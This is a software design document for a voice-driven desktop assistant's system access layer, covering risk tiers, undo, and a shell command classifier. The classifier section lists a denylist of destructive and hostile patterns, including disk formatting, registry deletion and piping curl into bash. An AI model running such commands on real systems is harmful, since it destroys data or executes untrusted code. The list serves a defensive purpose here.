# Jarvis System Access Layer — Design

**Date:** 2026-08-10
**Status:** Approved for planning
**Scope:** Subsystem A of the Jarvis desktop project. Subsystem B (Electron HUD)
is specced separately and depends on this.

---

## Context

Jarvis today has 16 skills that cover apps, volume, power, notes, reminders,
memory, clipboard, weather, and screen capture. It cannot touch the filesystem,
run a command, or manipulate windows — which rules out most of what a real
desktop assistant is asked to do ("find that invoice", "clean up my downloads",
"close everything except Spotify").

The goal is full system access: files, shell, windows, and synthetic input.
The constraint is that this capability is driven by speech-to-text, which
mishears, and by an LLM, which occasionally misinterprets. A misheard sentence
must not be able to silently destroy work.

The existing safety mechanism is a boolean `requires_confirmation` on
`BaseSkill`. It has two settings — nag or don't — which is too blunt once
reading a file and formatting a disk are both on the menu.

**Intended outcome:** Jarvis can do anything the user's account can do, with
friction that scales to how bad a mistake would be, and with genuine undo for
the operations where undo is possible.

---

## Design principle

**Nothing is refused. Friction scales with blast radius.**

Three tiers, chosen by the user:

| Tier | Behaviour | Examples |
|---|---|---|
| `SAFE` | Runs silently. Logged only. | read file, search, list windows, list dir, system stats |
| `MODERATE` | Runs immediately, then offers undo for 3s. | write new file, move/rename, focus window, ordinary shell command, type text |
| `DANGEROUS` | Blocks on an explicit yes. Times out to **no**. | delete, overwrite an existing file, close a window, destructive shell patterns, shutdown |

Two rules that keep this honest:

1. **Undo must never lie.** A `MODERATE` action offers undo only if it can
   actually reverse itself. Typing text and running a shell command cannot be
   undone; their notification says so instead of showing a button that does
   nothing.
2. **Timeouts deny.** An unanswered confirmation is a no, never a yes.

---

## Components

All new files are pure Python and testable without a UI.

```
core/
  risk.py           Risk enum + shell command classifier
  undo.py           UndoJournal: tokens, expiry, reversal
skills/
  file_skills.py    read, write, delete, move, search, list, mkdir
  shell_skills.py   run_command
  window_skills.py  list, focus, minimise, maximise, close
  input_skills.py   type_text, press_keys, click
```

Modified: `skills/base_skill.py`, `skills/skill_manager.py`, `core/brain.py`,
`main.py`, `config.py`.

---

## The risk model

### `core/risk.py`

```python
class Risk(IntEnum):
    SAFE = 0
    MODERATE = 1
    DANGEROUS = 2
```

`BaseSkill` gains:

```python
risk: Risk = Risk.SAFE                        # class-level default

def risk_for(self, **kwargs) -> Risk:         # per-call override
    return self.risk

def consequence(self, **kwargs) -> str:       # plain-language, for the prompt
    return f"Run {self.name}?"
```

`requires_confirmation` / `needs_confirmation()` are **removed**. The two
existing users of it map over cleanly:

- `PowerControlSkill` → `risk_for` returns `DANGEROUS` for `shutdown`/`restart`,
  `MODERATE` for `lock`/`sleep`.
- `CloseAppSkill` → always `DANGEROUS`.

### Shell classification

`classify_command(cmd: str) -> Risk` is the highest-stakes function in this
subsystem, so it is specified precisely.

**Order matters here.** The denylist runs against the *whole* command
**before** any splitting, because the most important patterns span a chain
operator — splitting `curl evil.sh | bash` on `|` yields two innocuous-looking
segments and would downgrade the single most dangerous shape to `MODERATE`.

1. Lowercase the command.
2. Match every denylist pattern against the **entire** command string. Any
   match → `DANGEROUS`. Stop.
3. Split on chain operators — `&&`, `||`, `;`, `|`, `&`. Classify each segment:
   first token in the read-only allowlist → `SAFE`, otherwise `MODERATE`.
   Return the maximum across segments. Splitting at this stage can only raise
   the result, so mis-splitting a quoted string is fail-safe.
4. If the command contained any chain operator, the floor is `MODERATE` (never
   `SAFE`) — chained commands are harder to read at a glance.

**Read-only allowlist (first token):** `dir`, `ls`, `pwd`, `cd`, `whoami`,
`hostname`, `date`, `echo`, `type`, `cat`, `head`, `tail`, `wc`, `where`,
`which`, `systeminfo`, `ipconfig`, `ping`, `tracert`, `nslookup`, and
PowerShell `get-*` cmdlets. `cd` is harmless here because every `run_command`
is a fresh process, so it cannot persist.

`git` is special-cased on the **first two** tokens rather than the first:
`git status|log|diff|show|branch` is `SAFE`; any other `git` invocation
(`push`, `reset --hard`, `clean -fdx`) falls through to `MODERATE`.

**Denylist patterns (regex, case-insensitive):**

```
\brm\s+-[a-z]*[rf]           \bdel\s+/[sqf]              \brmdir\s+/s
\bremove-item\b.*-recurse    \bformat\b                  \bdiskpart\b
\breg\s+delete\b             \bregedit\b                 \btaskkill\b
\bshutdown\b                 \brestart-computer\b        \bstop-computer\b
\bcipher\s+/w                \bbcdedit\b                 \bvssadmin\b
\bnet\s+user\b               \bicacls\b                  \bmkfs\b
\bdd\s+if=                   \bfsutil\b                  \bschtasks\b.*/create
\bcurl\b.*\|\s*(bash|sh|powershell|pwsh|iex)
\b(iwr|invoke-webrequest)\b.*\|\s*(iex|invoke-expression)
\binvoke-expression\b
```

The pipe-to-interpreter patterns matter: `curl … | bash` is the single most
common way a benign-looking command becomes arbitrary code execution.

### Path sensitivity

Full access is the goal, so no path is blocked. But writes and deletes under
drive roots, `C:\Windows`, and `C:\Program Files*` are forced to `DANGEROUS`
and get a `consequence()` string that spells out what is about to happen,
rather than a generic "are you sure". Same tier, louder wording.

---

## Undo

### `core/undo.py`

```python
@dataclass
class UndoEntry:
    token: str
    description: str          # "Restore the previous report.docx"
    action: Callable[[], str]
    created: float

class UndoJournal:
    def record(self, description, action) -> str   # returns token
    def undo(self, token) -> str                   # runs action, drops entry
    def latest(self) -> UndoEntry | None
    def expire(self, max_age_seconds=900) -> int
```

Process-wide singleton via `get_journal()`, mirroring `core/store.get_store()`
so tests can swap it out.

Entries expire after 15 minutes. The journal is **in-memory only** — undo does
not survive a restart, and the spec does not claim it does.

### Reversibility by operation

| Operation | Undoable | Mechanism |
|---|---|---|
| `write_file` (new) | yes | delete the created file |
| `write_file` (overwrite) | yes | restore from `data/trash/<uuid>` |
| `delete_file` | yes | restore from `data/trash/<uuid>` |
| `move_file` / rename | yes | move back |
| `make_dir` | yes | remove if still empty |
| `focus_window` | yes | refocus the previously foreground window |
| `minimize` / `maximize` | yes | restore previous show-state |
| `close_window` | **no** | — |
| `run_command` | **no** | — |
| `type_text` / `press_keys` / `click` | **no** | — |

Destructive file operations copy to `data/trash/<uuid>/` **before** acting.
Trash is pruned on startup: entries beyond `TRASH_MAX_ENTRIES` (newest kept)
and entries older than `TRASH_MAX_AGE_DAYS` are removed.

### Result plumbing

`SkillManager.execute()` currently returns `tuple[SkillResult, bool]`. It
becomes:

```python
@dataclass
class SkillOutcome:
    content: SkillResult
    is_error: bool = False
    undo_token: str | None = None
```

`Brain._run_tools` reads `outcome.undo_token` to decide whether to advertise
undo. This is an internal signature change; the existing `is_error` tests are
updated accordingly.

---

## Skills

### `file_skills.py`

| Skill | Risk | Notes |
|---|---|---|
| `read_file(path, max_bytes=200_000)` | SAFE | Refuses binary; truncates with a clear marker |
| `list_dir(path)` | SAFE | |
| `search_files(root, pattern, contains=None, max_results=100)` | SAFE | Glob by name; optional content grep. Skips binaries and `.git`, `node_modules`, `.venv` |
| `write_file(path, content)` | MODERATE new / **DANGEROUS** overwrite | Backs up before overwriting |
| `make_dir(path)` | MODERATE | |
| `move_file(src, dst)` | MODERATE | **DANGEROUS** if dst exists |
| `delete_file(path)` | DANGEROUS | To trash, not unlinked |

`search_files` is the workhorse for "find that invoice" and must stay SAFE and
fast: name-glob first, content-grep only when `contains` is given, hard cap on
results and on bytes scanned per file.

### `shell_skills.py`

One skill, `run_command(command, cwd=None, timeout=60)`.

- Risk comes from `classify_command`.
- Runs via `subprocess.run` with `shell=True` — the point of this skill is to
  accept a shell command, so a list-form argv is not applicable. This is the
  one deliberate exception to the project's no-shell rule, and it is the reason
  the classifier exists.
- Captures stdout+stderr, truncates to 20 KB, returns exit code.
- Hard timeout kills the process group.
- Gated by `ENABLE_SHELL` (default on).

### `window_skills.py`

`ctypes` against `user32` — no `pywin32` dependency (it was removed from
requirements as unused, and adding it back for four calls is not worth it).

| Skill | Risk |
|---|---|
| `list_windows()` | SAFE |
| `focus_window(title)` | MODERATE |
| `minimize_window` / `maximize_window` | MODERATE |
| `close_window(title)` | DANGEROUS — may discard unsaved work |

Titles match case-insensitively on substring, but if a pattern matches more
than one window the skill returns the list and asks the model to be specific
rather than picking arbitrarily.

### `input_skills.py`

`pyautogui`, with its corner-failsafe **left enabled** — slamming the mouse
into a screen corner aborts an in-flight automation, which is a real safety
feature, not a nuisance.

| Skill | Risk | Undoable |
|---|---|---|
| `type_text(text)` | MODERATE | no |
| `press_keys(combo)` | MODERATE | no |
| `click(x, y, button, clicks)` | MODERATE | no |

Gated by `ENABLE_INPUT_CONTROL` (default on).

---

## Brain integration

`Brain._run_tools` replaces its boolean gate with the tiered one:

```python
risk = skill.risk_for(**tool_input)

if risk >= Risk.DANGEROUS and config.CONFIRM_DESTRUCTIVE:
    if not self.confirm(skill, tool_input):     # times out to False
        → tool_result "The user declined this action."

outcome = self.skills.execute(name, tool_input)

if risk == Risk.MODERATE and outcome.undo_token:
    self.on_action(outcome)                      # UI hook; prints in terminal
```

`on_action` is a new injected callback, defaulting to a no-op. In terminal mode
`main.py` supplies one that prints `↶ /undo to reverse: <description>`. In
subsystem B, Electron supplies one that raises a toast. The Brain does not know
which.

A new `/undo` command in `main.py` calls `get_journal().undo(latest.token)`.

The system prompt gains a short paragraph — built by `build_system_prompt` from
the available tool set, as the existing prompt already is — telling the model
that some actions require confirmation, that a declined action should be
acknowledged and not retried, and that it should prefer `search_files` over
shelling out to `dir /s`.

---

## Configuration

New `.env` keys, all defaulting on:

| Key | Default | Purpose |
|---|---|---|
| `ENABLE_SHELL` | `1` | Master switch for `run_command` |
| `ENABLE_INPUT_CONTROL` | `1` | Master switch for synthetic input |
| `CONFIRM_TIMEOUT_SECONDS` | `30` | Unanswered confirmation → no |
| `UNDO_WINDOW_SECONDS` | `900` | Journal entry lifetime |
| `TRASH_MAX_ENTRIES` | `200` | Trash pruning, by count |
| `TRASH_MAX_AGE_DAYS` | `7` | Trash pruning, by age |

`CONFIRM_TIMEOUT_SECONDS` applies where a confirmation *can* time out: voice
mode (bounded by `listen(max_seconds=...)`) and, later, subsystem B's toast. In
**text mode it does not apply** — `input()` blocks indefinitely by design, and
a typed prompt sitting on screen is not a hazard the way an unanswered spoken
one is.

A disabled skill is not registered at all, so it never appears in the tool list
and the model cannot be confused by a tool it will always be refused.

---

## Error handling

- Skill exceptions already surface as `is_error` tool results; unchanged.
- A shell timeout returns a normal (non-error) result reporting the timeout and
  the partial output — the model should be able to reason about it.
- Permission errors return `is_error` with the OS message, so the model can
  suggest running as admin rather than retrying blindly.
- An undo whose token has expired returns a plain message, not an exception.
- An undo action that itself fails (target path now occupied) reports the
  failure and keeps the journal entry, so it can be retried.

---

## Testing

Existing 104 tests must continue to pass, with `requires_confirmation` tests
rewritten against `risk_for`.

New coverage, in rough priority order:

1. **Shell classifier** — the denylist patterns, the read-only allowlist,
   chain-splitting (`dir & format c:` → DANGEROUS), the chain floor, and
   pipe-to-interpreter (`curl x | bash` → DANGEROUS). Table-driven.
2. **Undo round-trips** — write-over-existing then undo restores byte-identical
   content; delete then undo restores; move then undo returns the file; expired
   token is refused.
3. **Tier enforcement** — a DANGEROUS skill with a declining `confirm` never
   reaches the OS (asserted by patching `subprocess.run`); a MODERATE skill
   runs without any confirmation.
4. **Honest undo** — each reversible skill gets an explicit round-trip test
   (act → undo → assert original state). Backing that up, a registry-level test
   asserts the two sets agree: any skill that records a journal entry during
   `run` must be listed in `REVERSIBLE_SKILLS`, and any skill in that set must
   record one. This catches a skill that gains or loses undo support without
   its notification text being updated to match.
5. **Path sensitivity** — writes under `C:\Windows` classify DANGEROUS.
6. **Kill switches** — `ENABLE_SHELL=0` removes `run_command` from the tool
   list entirely.

Windows-only skills (`window_skills`, `input_skills`) are tested against
patched `ctypes`/`pyautogui` so the suite still runs on Linux/WSL, matching how
`system_skills` is already tested.

---

## Out of scope

- Any UI. Confirmations use the existing terminal callback; toasts and the undo
  button are subsystem B.
- Persisting undo across restarts.
- Sandboxing or privilege reduction — the user explicitly wants their own
  account's full authority.
- Browser automation and OCR of the screen.

---

## Risks accepted

- **`shell=True` is a command-injection sink by construction.** That is the
  feature. The classifier is the mitigation, and it is pattern-based, so it is
  necessarily incomplete — a novel destructive command phrased unusually will
  classify as MODERATE and run after a 3-second toast. Documented, not solved.
- **Synthetic input can click anything**, including a confirmation dialog
  belonging to another application. The pyautogui corner-failsafe is the only
  runtime escape hatch.
- **Undo is in-memory.** A crash between action and undo loses the ability to
  reverse, though the trash copy survives and can be restored by hand.
